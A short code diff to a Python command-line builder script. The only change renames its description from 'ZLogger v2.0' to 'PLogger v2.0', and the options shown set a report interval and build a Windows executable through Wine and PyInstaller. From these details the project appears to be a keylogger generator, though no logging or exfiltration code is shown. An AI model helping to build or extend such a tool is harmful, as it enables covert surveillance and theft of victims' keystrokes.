@@ -7,7 +7,7 @@ import os
 WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description='ZLogger v2.0')
+    parser = argparse.ArgumentParser(description='PLogger v2.0')
     parser._optionals.title = "Optional Arguments"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
